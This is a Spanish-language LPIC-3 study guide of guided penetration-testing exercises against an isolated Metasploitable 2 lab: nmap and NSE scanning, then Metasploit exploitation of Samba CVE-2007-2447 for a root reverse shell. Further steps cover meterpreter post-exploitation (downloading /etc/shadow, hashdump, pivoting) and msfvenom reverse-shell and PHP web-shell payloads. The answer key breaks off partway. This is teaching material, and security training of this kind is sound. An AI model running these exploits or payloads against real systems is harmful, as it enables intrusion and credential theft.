# Tema 335.2: Penetration Testing — Ejercicios guiados

> **Examen:** LPI 303-300, versión 3.0.0 · **Peso del objetivo:** 5
> **Objetivo oficial:** <https://www.lpi.org/our-certifications/exam-303-objectives/>
> **Alcance de estos ejercicios:** la mecánica de una prueba de penetración tal como la evalúa LPI — las fases de un engagement, el descubrimiento y la enumeración de hosts con **nmap** y el **Nmap Scripting Engine (NSE)**, el manejo del **Metasploit Framework** (`msfconsole`, tipos de módulos, `meterpreter`), y la construcción de payloads autónomos con **msfvenom**.

---

## Antes de empezar: autorización y aislamiento del laboratorio

Toda técnica que aparece a continuación es ofensiva por naturaleza. Ejecutarla contra un host que no te pertenece, o fuera de un alcance escrito, es un delito en la mayoría de las jurisdicciones y una violación de la fase de pre-engagement del PTES. **Estos ejercicios apuntan a un laboratorio que construís vos mismo, en una red aislada, contra imágenes deliberadamente vulnerables.** Nada de lo que hay acá debería tocar jamás una red de producción ni a un tercero.

**Topología del laboratorio usada a lo largo del tema:**

| Rol | Hostname | Dirección | Imagen |
|---|---|---|---|
| Atacante | `kali` | `192.168.56.10` | Kali Linux (o cualquier distro con nmap + Metasploit) |
| Objetivo | `metasploitable` | `192.168.56.101` | Metasploitable 2 |

Ambas máquinas están en una red del hipervisor **host-only / interna** `192.168.56.0/24` **sin gateway hacia Internet ni hacia la LAN**. Metasploitable 2 está deliberadamente plagada de vulnerabilidades; nunca la conectes en modo bridge a una red real.

Fuentes:
- PTES Technical Guidelines — <http://www.pentest-standard.org/index.php/Main_Page>
- Metasploitable 2 documentation — <https://docs.rapid7.com/metasploit/metasploitable-2/>

---

## Ejercicio 1 — Las fases de una prueba de penetración

LPI espera que sepas nombrar y ordenar las fases de un engagement y ubicar cada herramienta en la fase correcta. Antes de tocar una herramienta, interiorizá el modelo.

**Pasos**

1. Leé el modelo de siete fases del PTES y mapealo en un archivo de notas:

   ```
   1. Pre-engagement Interactions   -> scope, rules of engagement (RoE), authorization
   2. Intelligence Gathering        -> reconnaissance (passive + active)
   3. Threat Modeling               -> which assets, which attack paths
   4. Vulnerability Analysis        -> identify weaknesses (maps to 335.1)
   5. Exploitation                  -> gain access
   6. Post-Exploitation             -> pivot, persist, assess impact
   7. Reporting                     -> findings, risk, remediation
   ```

2. Clasificá el **reconnaissance** en sus dos subtipos y dá una herramienta para cada uno:

   ```
   Passive recon  -> no packets to the target (whois, DNS, search engines, Shodan)
   Active recon   -> packets sent to the target (nmap host discovery, banner grabbing)
   ```

3. Distinguí la **enumeración** del reconnaissance. Escribí una definición de una línea:

   ```
   Enumeration = actively querying an already-discovered service to extract
   concrete objects: usernames, shares, SNMP OIDs, SMTP recipients, service
   versions. It is deeper and noisier than discovery.
   ```

4. Anotá los dos estilos de engagement que te van a pedir contrastar:

   ```
   Black box -> tester has no prior knowledge (external attacker simulation)
   White box -> tester has full knowledge (source, creds, architecture)
   Grey box  -> partial knowledge (a typical "assumed breach" test)
   ```

**Verificá tu comprensión**

- **Q1.1** ¿A qué fase del PTES pertenece la autorización firmada / las Rules of Engagement, y por qué debe preceder a todo lo demás?
- **Q1.2** Un tester ejecuta `nmap -sn` contra el rango objetivo. ¿Es reconnaissance pasivo o activo? Justificá.
- **Q1.3** ¿Dónde se ubica el **vulnerability analysis** en relación con la **exploitation**, y qué objetivo de LPI lo cubre por separado?

---

## Ejercicio 2 — Reconnaissance: descubrimiento de hosts con nmap

Objetivo: encontrar hosts vivos en `192.168.56.0/24` sin escanear puertos todavía.

**Pasos**

1. Confirmá tu dirección de atacante y la ruta a la red del laboratorio:

   ```bash
   ip -4 addr show
   ip route get 192.168.56.101
   ```

2. Ejecutá un **ping sweep** (solo descubrimiento de hosts — el flag `-sn` deshabilita el escaneo de puertos):

   ```bash
   nmap -sn 192.168.56.0/24
   ```

   Esperado (abreviado):

   ```
   Starting Nmap 7.94 ( https://nmap.org )
   Nmap scan report for 192.168.56.10
   Host is up (0.00021s latency).
   Nmap scan report for 192.168.56.101
   Host is up (0.00042s latency).
   MAC Address: 08:00:27:AB:CD:EF (Oracle VirtualBox virtual NIC)
   Nmap done: 256 IP addresses (2 hosts up) scanned in 2.11 seconds
   ```

3. Entendé *cómo* `-sn` decide que un host está up en un segmento local. En la misma red de capa 2, nmap usa **ARP requests** (rápidas y confiables), no ICMP. Comprobalo forzando a nmap a saltearse ARP:

   ```bash
   sudo nmap -sn --send-ip 192.168.56.101
   ```

   Después compará el tráfico de sondeo:

   ```bash
   sudo nmap -sn --packet-trace 192.168.56.101 2>&1 | head
   ```

   Las líneas de traza esperadas muestran `ARP who-has 192.168.56.101 tell 192.168.56.10`.

4. Fuera del segmento, nmap recae en ICMP echo, TCP SYN al 443, TCP ACK al 80 e ICMP timestamp. Mirá esos tipos de sondeo listados:

   ```bash
   nmap -sn -PE -PS443 -PA80 -PP 192.168.56.101
   ```

**Verificá tu comprensión**

- **Q2.1** ¿Qué hace exactamente `nmap -sn`, y qué es lo que deliberadamente *no* hace?
- **Q2.2** En la misma LAN, ¿qué mecanismo de capa 2 usa nmap para el descubrimiento de hosts, y por qué es más confiable ahí que ICMP echo?
- **Q2.3** Un firewall descarta todo el ICMP. ¿Qué sondeos de descubrimiento de hosts de nmap todavía podrían marcar el host como "up", y qué flags los solicitan?

---

## Ejercicio 3 — Escaneo de puertos y enumeración de servicios/versiones

Objetivo: enumerar los puertos abiertos e identificar el software detrás de ellos en el objetivo.

**Pasos**

1. Ejecutá un **TCP SYN scan** por defecto (el escaneo half-open; requiere root porque construye paquetes en crudo):

   ```bash
   sudo nmap -sS 192.168.56.101
   ```

   Esperado (abreviado — Metasploitable 2 está intencionalmente abierta de par en par):

   ```
   PORT     STATE SERVICE
   21/tcp   open  ftp
   22/tcp   open  ssh
   23/tcp   open  telnet
   25/tcp   open  smtp
   80/tcp   open  http
   139/tcp  open  netbios-ssn
   445/tcp  open  microsoft-ds
   3306/tcp open  mysql
   5432/tcp open  postgresql
   ```

2. Contrastá los tipos de escaneo y conocé la diferencia:

   ```bash
   sudo nmap -sS 192.168.56.101      # SYN / half-open: never completes the handshake
   nmap -sT 192.168.56.101           # TCP connect(): full handshake, no root needed, noisier
   sudo nmap -sU --top-ports 20 192.168.56.101   # UDP scan (slow; relies on ICMP port-unreachable)
   ```

3. Entendé los seis **port states** de nmap. Agregá detección de versiones y un escaneo de todos los puertos:

   ```bash
   sudo nmap -sS -sV -p- 192.168.56.101
   ```

   - `-p-` escanea los 65535 puertos TCP (el default son los top 1000).
   - `-sV` sondea cada puerto abierto para hacer el fingerprint del **producto y la versión**.

   Esperado (abreviado):

   ```
   PORT     STATE SERVICE     VERSION
   21/tcp   open  ftp         vsftpd 2.3.4
   22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
   80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
   445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
   3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
   ```

4. Agregá detección de OS y ajustá el timing/agresividad:

   ```bash
   sudo nmap -sS -sV -O -T4 192.168.56.101
   ```

   `-O` adivina el OS a partir de los fingerprints del stack TCP/IP; `-T4` es la plantilla de timing agresiva-pero-segura (`-T0` paranoid … `-T5` insane). `-A` agrupa `-sV -O --script=default --traceroute`.

5. Guardá la salida en los tres formatos para el reporte y para alimentar otras herramientas:

   ```bash
   sudo nmap -sS -sV -oA scans/metasploitable_full 192.168.56.101
   # produces .nmap (human), .gnmap (grepable), .xml (machine / Metasploit import)
   ```

**Verificá tu comprensión**

- **Q3.1** ¿Por qué `-sS` requiere privilegios de root mientras que `-sT` no, y cuál es más sigiloso?
- **Q3.2** Nombrá tres de los port states de nmap y explicá la diferencia entre `filtered` y `closed`.
- **Q3.3** ¿Qué hace `-sV` que un SYN scan simple no puede, y por qué `vsftpd 2.3.4` en la salida es una señal de alarma inmediata?
- **Q3.4** ¿Qué único flag de salida escribe archivos normal, grepable y XML de una sola vez, y por qué el XML es el que quiere Metasploit?

---

## Ejercicio 4 — El Nmap Scripting Engine (NSE)

Objetivo: pasar de "el puerto está abierto" a hallazgos concretos usando NSE, el motor Lua que convierte a nmap en un escáner de vulnerabilidades y enumerador liviano.

**Pasos**

1. Aprendé la disposición de los scripts y las categorías:

   ```bash
   ls /usr/share/nmap/scripts/ | head
   nmap --script-help "default"        # what runs with -sC / --script=default
   ```

   Categorías de NSE que tenés que reconocer: `auth`, `broadcast`, `brute`, `default`, `discovery`, `dos`, `exploit`, `external`, `fuzzer`, `intrusive`, `malware`, `safe`, `version`, `vuln`.

2. Ejecutá los scripts **default** junto con la detección de versiones (`-sC` es la abreviatura de `--script=default`):

   ```bash
   sudo nmap -sV -sC 192.168.56.101
   ```

3. Enumerá SMB — un objetivo clásico de LPIC-3. Ejecutá una categoría de scripts contra los puertos SMB:

   ```bash
   sudo nmap -p139,445 --script "smb-os-discovery,smb-enum-shares,smb-enum-users" 192.168.56.101
   ```

   Esperado (abreviado):

   ```
   Host script results:
   | smb-os-discovery:
   |   OS: Unix (Samba 3.0.20-Debian)
   |   Computer name: metasploitable
   | smb-enum-shares:
   |   \\192.168.56.101\tmp    Anonymous access: READ/WRITE
   | smb-enum-users:
   |   METASPLOITABLE\msfadmin (RID: 1000)
   ```

4. Ejecutá la categoría **vuln** para señalar CVEs conocidas (usa `--script-args` para el ajuste fino):

   ```bash
   sudo nmap -sV --script "vuln" -p21,80,445 192.168.56.101
   ```

   Se espera que aparezcan hallazgos como `smb-vuln-ms08-067`, `http-slowloris-check`, y el `ftp-vsftpd-backdoor` con backdoor (CVE-2011-2523).

5. Seleccioná scripts con expresiones booleanas/wildcard y pasá argumentos:

   ```bash
   # everything "safe" AND matching http-*, but not brute
   sudo nmap -p80 --script "safe and http-*" 192.168.56.101
   # HTTP enumeration with a specific wordlist argument
   sudo nmap -p80 --script http-enum --script-args http-enum.basepath=/ 192.168.56.101
   ```

6. Actualizá la base de datos de scripts después de agregar scripts:

   ```bash
   sudo nmap --script-updatedb
   ```

**Verificá tu comprensión**

- **Q4.1** ¿De qué es abreviatura `-sC`, y qué categoría de NSE ejecuta?
- **Q4.2** ¿Por qué evitarías ejecutar las categorías `intrusive`, `dos` o `brute` contra el sistema de producción de un cliente sin permiso explícito por escrito?
- **Q4.3** Escribí el selector `--script` que ejecuta todos los scripts que sean a la vez `safe` **y** cuyo nombre empiece con `smb-`.
- **Q4.4** ¿Qué categoría de NSE convierte a nmap en un escáner de vulnerabilidades, y qué detecta `ftp-vsftpd-backdoor` en este objetivo?

Fuentes:
- Nmap Reference Guide — <https://nmap.org/book/man.html>
- NSE documentation & script categories — <https://nmap.org/book/nse.html> · <https://nmap.org/nsedoc/>

---

## Ejercicio 5 — Metasploit Framework: msfconsole, la base de datos y la importación de escaneos

Objetivo: iniciar Metasploit, respaldarlo con PostgreSQL, y traer tus resultados de nmap a un workspace.

**Pasos**

1. Inicializá la base de datos y lanzá la consola:

   ```bash
   sudo msfdb init          # creates the PostgreSQL database and role
   msfconsole -q            # -q suppresses the banner
   ```

2. Confirmá la conectividad con la base de datos y creá un workspace dedicado:

   ```
   msf6 > db_status
   [*] Connected to msf. Connection type: postgresql.

   msf6 > workspace -a lpic3-lab
   [*] Added workspace: lpic3-lab
   msf6 > workspace lpic3-lab
   ```

3. Poblá el workspace de dos maneras — importá el XML del Ejercicio 3, o escaneá a través de Metasploit con `db_nmap` (el mismo nmap, resultados almacenados automáticamente):

   ```
   msf6 > db_import scans/metasploitable_full.xml
   [*] Successfully imported .../metasploitable_full.xml

   msf6 > db_nmap -sV 192.168.56.101
   ```

4. Consultá los objetos almacenados:

   ```
   msf6 > hosts
   msf6 > services
   msf6 > services -p 445 -R          # set RHOSTS to hosts running SMB
   msf6 > vulns
   ```

   `services -R` y `hosts -R` empujan las direcciones coincidentes a `RHOSTS` para el siguiente módulo — el flujo de trabajo que el examen espera que conozcas.

**Verificá tu comprensión**

- **Q5.1** ¿Qué base de datos respalda a Metasploit, y qué crea `msfdb init`?
- **Q5.2** Dá dos maneras de meter los resultados de nmap en la base de datos de Metasploit, y nombrá el comando de workspace que aísla un engagement de otro.
- **Q5.3** ¿Qué le hace `services -p 445 -R` a la opción global del datastore `RHOSTS`?

---

## Ejercicio 6 — Tipos de módulos de Metasploit, y la ejecución de un módulo auxiliary

Objetivo: entender la taxonomía de módulos que lista LPI, y después ejecutar un scanner **auxiliary**.

**Pasos**

1. Memorizá los tipos de módulos y qué hace cada uno:

   ```
   auxiliary -> scanning, fuzzing, brute-forcing, DoS — anything that is not a
                full exploit and does not deliver a payload
   exploit   -> code that leverages a vulnerability to run a payload on the target
   payload   -> the code that runs after successful exploitation (shell, meterpreter)
   encoder   -> transforms a payload to evade byte constraints / naive signatures
   nop       -> no-operation generators for padding/sled alignment
   post      -> post-exploitation modules, run against an existing session
   evasion   -> modules built specifically to bypass AV/defenses
   ```

2. Buscá en la base de datos de módulos y leé los metadatos de un módulo:

   ```
   msf6 > search type:auxiliary name:smb_version
   msf6 > use auxiliary/scanner/smb/smb_version
   msf6 auxiliary(scanner/smb/smb_version) > info
   msf6 auxiliary(scanner/smb/smb_version) > show options
   ```

3. Configurá las opciones y ejecutá el scanner:

   ```
   msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.56.101
   msf6 auxiliary(scanner/smb/smb_version) > run
   [*] 192.168.56.101:445 - SMB Detected (versions:1) (preferred dialect:) ...
   [*] 192.168.56.101:445 -   Host is running Unix, Samba 3.0.20-Debian
   ```

4. Ejecutá un auxiliary de login/brute contra FTP para ver la enumeración de credenciales (sigue siendo auxiliary — no se entrega ningún payload):

   ```
   msf6 > use auxiliary/scanner/ftp/ftp_login
   msf6 auxiliary(scanner/ftp/ftp_login) > set RHOSTS 192.168.56.101
   msf6 auxiliary(scanner/ftp/ftp_login) > set USER_FILE users.txt
   msf6 auxiliary(scanner/ftp/ftp_login) > set PASS_FILE passwords.txt
   msf6 auxiliary(scanner/ftp/ftp_login) > run
   ```

**Verificá tu comprensión**

- **Q6.1** Listá los tipos de módulos y establecé la única línea que distingue a un módulo **auxiliary** de un módulo **exploit**.
- **Q6.2** ¿Cuál es la diferencia entre un **payload** y un **encoder**?
- **Q6.3** ¿Qué comando carga un módulo en el contexto actual, y qué dos comandos revelan sus opciones requeridas y su descripción?

---

## Ejercicio 7 — Exploitation: obtener una sesión de meterpreter

Objetivo: explotar una vulnerabilidad conocida en el objetivo y aterrizar una sesión de **meterpreter**, y después contrastar staged vs. stageless y bind vs. reverse payloads.

**Pasos**

1. Seleccioná un exploit confiable para este objetivo. La inyección de comandos de Samba `usermap_script` (CVE-2007-2447) es un ejemplo limpio:

   ```
   msf6 > search usermap_script
   msf6 > use exploit/multi/samba/usermap_script
   msf6 exploit(multi/samba/usermap_script) > info
   ```

2. Inspeccioná y elegí un **payload**. Listá qué es compatible, después leé la gramática de nombres:

   ```
   msf6 exploit(multi/samba/usermap_script) > show payloads
   ```

   Gramática del nombre del payload (aprendé a leerla):

   ```
   cmd/unix/reverse            -> platform/arch/direction, single-stage (stageless)
   linux/x86/meterpreter/reverse_tcp
        ^os   ^arch ^payload   ^stager  (the "/" before reverse_tcp marks it STAGED)
   ```

   - **Staged** (`meterpreter/reverse_tcp`): primero corre un stager diminuto, luego trae el stage grande por la conexión. Huella inicial pequeña.
   - **Stageless / single** (`meterpreter_reverse_tcp`, o `cmd/unix/reverse`): todo el payload se envía de una vez. Más robusto ante enlaces inestables.
   - **reverse**: el objetivo se conecta de vuelta *a vos* (`LHOST`/`LPORT`) — supera firewalls entrantes/NAT.
   - **bind**: el objetivo abre un listener y *vos* te conectás a él — falla si lo entrante está filtrado.

3. Configurá el payload y las opciones requeridas, después explotá:

   ```
   msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.101
   msf6 exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse
   msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.56.10
   msf6 exploit(multi/samba/usermap_script) > set LPORT 4444
   msf6 exploit(multi/samba/usermap_script) > exploit
   [*] Started reverse TCP double handler on 192.168.56.10:4444
   [*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.101:...)
   id
   uid=0(root) gid=0(root)
   ```

4. Conseguí una sesión completa de **meterpreter** contra un servicio que lo soporte. Usá el backdoor de vsftpd 2.3.4 o, para una demo de payload meterpreter, un objetivo Java/HTTP. Acá, elevá la shell a meterpreter:

   ```
   msf6 > sessions -l                       # list active sessions
   msf6 > sessions -u 1                      # upgrade shell session 1 to meterpreter
   msf6 > sessions -i 2                      # interact with meterpreter session 2
   meterpreter > sysinfo
   Computer     : metasploitable
   OS           : Linux metasploitable 2.6.24-16-server
   Meterpreter  : x86/linux
   ```

5. Poné en segundo plano y gestioná las sesiones sin matarlas:

   ```
   meterpreter > background          # Ctrl+Z equivalent, returns to msf prompt
   msf6 > sessions -K                # kill ALL sessions (cleanup)
   ```

**Verificá tu comprensión**

- **Q7.1** En `linux/x86/meterpreter/reverse_tcp`, identificá el OS, la arquitectura, el payload y el stager, y decí si es staged o stageless.
- **Q7.2** Tu objetivo está detrás de NAT con todos los puertos entrantes filtrados pero con la salida sin restricciones. ¿Elegís un payload **bind** o **reverse**, y qué opciones del datastore (`LHOST`/`LPORT` vs `RHOST`/`RPORT`) tenés que configurar?
- **Q7.3** ¿Qué ventaja te da un payload de **meterpreter** por sobre una shell simple `cmd/unix/reverse`?
- **Q7.4** ¿Qué comando pone una sesión en segundo plano, y cuál lista todas las sesiones activas?

---

## Ejercicio 8 — Post-exploitation con meterpreter

Objetivo: usar la sesión para demostrar el impacto — la fase que produce los hallazgos que importan en el reporte.

**Pasos**

1. Conciencia situacional básica:

   ```
   meterpreter > getuid
   meterpreter > sysinfo
   meterpreter > ifconfig
   meterpreter > ps
   ```

2. Operaciones de archivos y recolección de botín (loot):

   ```
   meterpreter > pwd
   meterpreter > download /etc/passwd loot/passwd
   meterpreter > download /etc/shadow loot/shadow
   meterpreter > cat /etc/issue
   ```

3. Ejecutá un módulo **post** contra la sesión (nota: los módulos post toman `SESSION`, no `RHOSTS`):

   ```
   meterpreter > background
   msf6 > use post/linux/gather/hashdump
   msf6 post(linux/gather/hashdump) > set SESSION 2
   msf6 post(linux/gather/hashdump) > run
   ```

4. Pivoting — enrutá el tráfico de una segunda subred a través de la sesión para que Metasploit pueda alcanzar hosts que de otro modo no podrías:

   ```
   meterpreter > run autoroute -s 10.10.10.0/24
   msf6 > use auxiliary/scanner/portscan/tcp
   msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.10.10.0/24
   msf6 auxiliary(scanner/portscan/tcp) > run          # now reaches the inner net via session 2
   ```

**Verificá tu comprensión**

- **Q8.1** Un módulo de post-exploitation necesita saber sobre qué host comprometido actuar — ¿qué opción del datastore lleva eso, y en qué se diferencia de `RHOSTS`?
- **Q8.2** En una oración, ¿qué es el **pivoting**, y qué comando de meterpreter arma la ruta?
- **Q8.3** ¿Por qué descargar `/etc/shadow` es una demostración de impacto y no un fin en sí mismo, y qué harías con él a continuación (nombrando la herramienta de LPIC-3 de un objetivo adyacente)?

---

## Ejercicio 9 — msfvenom: payloads autónomos y encoders

Objetivo: generar payloads por fuera de un exploit — la manera en que un tester entrega código a través de phishing, una subida de archivos o una web shell — y entender el encoding y sus límites.

**Pasos**

1. Mirá la interfaz. `msfvenom` reemplazó al viejo par `msfpayload`/`msfencode`:

   ```bash
   msfvenom --list payloads   | head
   msfvenom --list formats
   msfvenom --list encoders
   ```

2. Generá un ELF de reverse-shell para Linux:

   ```bash
   msfvenom -p linux/x86/meterpreter/reverse_tcp \
            LHOST=192.168.56.10 LPORT=4444 \
            -f elf -o /tmp/shell.elf
   ```

   Flags clave: `-p` payload, `-f` **formato** de salida (`elf`, `exe`, `raw`, `python`, `war`, `php`, `psh`), `-o` archivo de salida, `LHOST/LPORT` como opciones del payload.

3. Generá una web shell PHP para colar a través de una subida de archivos, y un EXE de Windows para contrastar:

   ```bash
   msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw -o shell.php
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o shell.exe
   ```

4. Aplicá un **encoder** y restringí los **bad characters** — el caso de uso clásico donde el parser del objetivo se atraganta con nulls/newlines:

   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 \
            -e x86/shikata_ga_nai -i 5 -b '\x00\x0a\x0d' -f exe -o /tmp/enc.exe
   ```

   `-e` encoder, `-i` iteraciones, `-b` lista de bad-chars a evitar. Entendé que `shikata_ga_nai` es un **encoder XOR polimórfico para confiabilidad/evitación de bad-chars — no un bypass de AV garantizado**; los motores modernos detectan su decoder stub.

5. Capturá el callback. Un payload de msfvenom es solo la mitad de la herramienta — todavía necesitás un handler:

   ```
   msf6 > use exploit/multi/handler
   msf6 exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
   msf6 exploit(multi/handler) > set LHOST 192.168.56.10
   msf6 exploit(multi/handler) > set LPORT 4444
   msf6 exploit(multi/handler) > run
   [*] Started reverse TCP handler on 192.168.56.10:4444
   ```

   El `PAYLOAD`, el `LHOST` y el `LPORT` en el handler **deben coincidir** con los horneados en la salida de msfvenom, o la negociación stager/stage falla.

**Verificá tu comprensión**

- **Q9.1** ¿Qué dos herramientas legadas consolidó `msfvenom`, y qué controlan `-p`, `-f` y `-e`?
- **Q9.2** ¿Cuál es el propósito real y defendible de `-b '\x00\x0a\x0d'` con un encoder — y de qué *no* es el encoding un sustituto confiable?
- **Q9.3** Después de entregar un payload `reverse_tcp` de msfvenom, ¿qué módulo de Metasploit recibe la conexión, y qué tres configuraciones en él deben coincidir con el payload generado?

Fuentes:
- Metasploit Framework documentation — <https://docs.metasploit.com/>
- Metasploit user guide (Rapid7) — <https://docs.rapid7.com/metasploit/>
- msfvenom reference — <https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html>

---

## Ejercicio 10 — Conciencia: el conjunto más amplio de herramientas y el reporting

El punto de LPI sobre "conciencia de las herramientas comunes" significa que deberías reconocer el ecosistema, no solo nmap y Metasploit.

**Pasos**

1. Emparejá cada herramienta con su fase:

   ```
   Recon / OSINT     -> whois, dig, theHarvester, recon-ng, Shodan, Maltego
   Web app testing   -> Burp Suite, OWASP ZAP, nikto, gobuster/dirb, sqlmap, wpscan
   Enumeration       -> nmap + NSE, enum4linux, smbclient, snmpwalk
   Exploitation      -> Metasploit, searchsploit / Exploit-DB, sqlmap
   Password attacks  -> hydra (online), john / hashcat (offline)
   C2 / post-exploit -> meterpreter, Empire, Cobalt Strike, Sliver
   ```

2. Encontrá un exploit local para una versión descubierta con la CLI de Exploit-DB:

   ```bash
   searchsploit vsftpd 2.3.4
   searchsploit samba 3.0.20
   ```

3. Estructurá un hallazgo para el reporte de la manera que espera el PTES — cada hallazgo lleva: título, activo afectado, descripción, evidencia/PoC, impacto de negocio, probabilidad, puntuación CVSS y remediación:

   ```
   Finding:      Samba "username map script" Command Injection (CVE-2007-2447)
   Asset:        192.168.56.101 (445/tcp, Samba 3.0.20-Debian)
   Severity:     Critical (CVSS 3.1: 9.8)
   Evidence:     meterpreter session as uid=0(root); see screenshot 4.
   Remediation:  Upgrade Samba >= 3.0.25; disable "username map script".
   ```

**Verificá tu comprensión**

- **Q10.1** Nombrá una herramienta para ataques de contraseñas online y una para el cracking de contraseñas offline, y establecé por qué el ataque offline suele preferirse una vez que tenés los hashes.
- **Q10.2** ¿Qué herramienta busca en la copia offline de Exploit-DB desde la línea de comandos, y cómo usarías su resultado si es un módulo de Metasploit?
- **Q10.3** Más allá de la PoC en crudo, nombrá tres campos que un hallazgo profesional debe contener para que el cliente priorice la remediación.

---

<details>
<summary><strong>Clave de respuestas — hacé clic para expandir</strong></summary>

### Ejercicio 1
- **A1.1** La autorización firmada / las Rules of Engagement pertenecen a **Pre-engagement Interactions** (fase 1 del PTES). Debe preceder a todo porque enviar un solo sondeo sin autorización escrita y un alcance definido es ilegal (acceso no autorizado) y expone al tester a responsabilidad legal; las RoE también fijan objetivos, tiempos, métodos y contactos de emergencia.
- **A1.2** Reconnaissance **activo**. `-sn` envía paquetes *hacia* el objetivo (ARP dentro del segmento, o sondeos ICMP/TCP fuera del segmento). El reconnaissance pasivo no envía nada al objetivo — usa fuentes de terceros como whois, DNS o Shodan.
- **A1.3** El **vulnerability analysis (fase 4 del PTES)** viene *antes* de la **exploitation (fase 5)**: identificás debilidades y después las aprovechás. LPI lo cubre por separado bajo el objetivo **335.1** (Common Security Vulnerabilities and Threats / vulnerability testing), mientras que 335.2 se enfoca en el proceso de penetration-testing y el herramental de exploitation.

### Ejercicio 2
- **A2.1** `-sn` realiza **solo descubrimiento de hosts** ("ping scan"): determina qué hosts están up. Deliberadamente **saltea el escaneo de puertos**, así que no reporta estados de puertos.
- **A2.2** En el mismo segmento de capa 2, nmap usa **ARP requests**. Es más confiable que ICMP echo porque un host debe responder ARP para participar de la red en absoluto, mientras que hosts y firewalls rutinariamente descartan ICMP echo; ARP además es más rápido y no puede ser filtrado por un firewall de capa IP.
- **A2.3** Con ICMP descartado, el descubrimiento de hosts todavía puede tener éxito vía **sondeos TCP SYN** (`-PS<ports>`), **sondeos TCP ACK** (`-PA<ports>`), **sondeos UDP** (`-PU<ports>`) y **SCTP INIT** (`-PY`). Los sondeos basados en ICMP `-PE` (echo), `-PP` (timestamp), `-PM` (netmask) serían los que fallan.

### Ejercicio 3
- **A3.1** `-sS` construye **paquetes SYN en crudo** y lee las respuestas en crudo, lo que requiere root/`CAP_NET_RAW`. `-sT` usa la syscall `connect()` del OS (sin privilegios). `-sS` es **más sigiloso** porque nunca completa el handshake de tres vías (envía RST tras el SYN/ACK), de modo que la conexión a menudo no queda registrada por la aplicación; `-sT` completa el handshake y es más probable que quede registrado.
- **A3.2** Tres cualesquiera de: `open`, `closed`, `filtered`, `unfiltered`, `open|filtered`, `closed|filtered`. **`closed`** significa que el host respondió (típicamente un TCP RST) — alcanzable pero sin nada escuchando. **`filtered`** significa que nmap no obtuvo una respuesta útil (descartada por un firewall/ACL), así que no puede decir si hay un servicio ahí — el paquete fue bloqueado.
- **A3.3** `-sV` envía sondeos de servicio y compara las respuestas contra la base de datos de fingerprints de nmap para reportar el **nombre del producto y la versión** (p. ej. `vsftpd 2.3.4`), lo que un SYN scan solo puede adivinar a partir del número de puerto. `vsftpd 2.3.4` es una señal de alarma porque esa versión específica se distribuyó con un **backdoor comprometido (CVE-2011-2523)** que abre una root shell en el puerto 6200.
- **A3.4** `-oA <basename>` escribe `.nmap`, `.gnmap` y `.xml` de una sola vez. El `db_import` de Metasploit consume el **XML** porque es estructurado/legible por máquina, permitiéndole a Metasploit poblar hosts, servicios y puertos con exactitud.

### Ejercicio 4
- **A4.1** `-sC` es la abreviatura de `--script=default`; ejecuta la categoría de NSE **`default`** (scripts seguros y generalmente útiles como `http-title`, `ssh-hostkey`, `smb-os-discovery`).
- **A4.2** Esas categorías son **ruidosas o dañinas**: `dos` puede crashear el servicio, `brute` puede bloquear cuentas y generar logs de autenticación masivos, `intrusive` puede alterar el estado o disparar un IDS. Ejecutarlas sin permiso escrito puede violar las RoE, causar una caída y crear exposición legal.
- **A4.3** `--script "safe and smb-*"`.
- **A4.4** La categoría **`vuln`**. `ftp-vsftpd-backdoor` detecta el backdoor malicioso integrado en **vsftpd 2.3.4 (CVE-2011-2523)**, que genera una root shell cuando se envía un nombre de usuario que contiene `:)`.

### Ejercicio 5
- **A5.1** **PostgreSQL**. `msfdb init` crea la base de datos y el rol de PostgreSQL que Metasploit usa para almacenar hosts, servicios, vulns, loot y sesiones, y escribe la configuración de conexión.
- **A5.2** (1) `db_import <file>.xml` para cargar un XML de nmap existente; (2) `db_nmap <args>` para escanear desde dentro de msfconsole y almacenar los resultados automáticamente. **`workspace`** (`workspace -a <name>` para agregar, `workspace <name>` para cambiar) aísla los engagements.
- **A5.3** Selecciona los servicios almacenados en el puerto **445** y, por el `-R`, escribe cada dirección de host coincidente en la opción global **`RHOSTS`** del datastore, de modo que el siguiente módulo apunte exactamente a esos hosts.

### Ejercicio 6
- **A6.1** Tipos: **auxiliary, exploit, payload, encoder, nop, post, evasion**. Línea distintiva: un **exploit** aprovecha una vulnerabilidad para **entregar y ejecutar un payload** en el objetivo; un módulo **auxiliary** hace todo lo demás (escanear, brute-force, fuzz, DoS) y **no entrega ningún payload**.
- **A6.2** Un **payload** es el código que se ejecuta en el objetivo tras una exploitation exitosa (p. ej. una reverse shell o meterpreter). Un **encoder** meramente **transforma** los bytes de un payload existente — para evitar bad characters o esquivar firmas ingenuas — sin cambiar lo que hace el payload.
- **A6.3** `use <module/path>` lo carga. `show options` lista las configuraciones requeridas/opcionales; `info` muestra la descripción, las referencias y los targets.

### Ejercicio 7
- **A7.1** OS = **linux**, arquitectura = **x86**, payload = **meterpreter**, stager = **reverse_tcp**. El `/` que separa `meterpreter` de `reverse_tcp` lo marca como **staged** (un stager pequeño carga el stage más grande por la conexión).
- **A7.2** Elegí un payload **reverse** — el objetivo inicia la conexión saliente, que pasa NAT y un firewall que filtra lo entrante. Configurá **`LHOST`** (tu IP de atacante) y **`LPORT`** (tu puerto de escucha); `RHOST`/`RPORT` son para payloads bind donde vos te conectás *hacia adentro*.
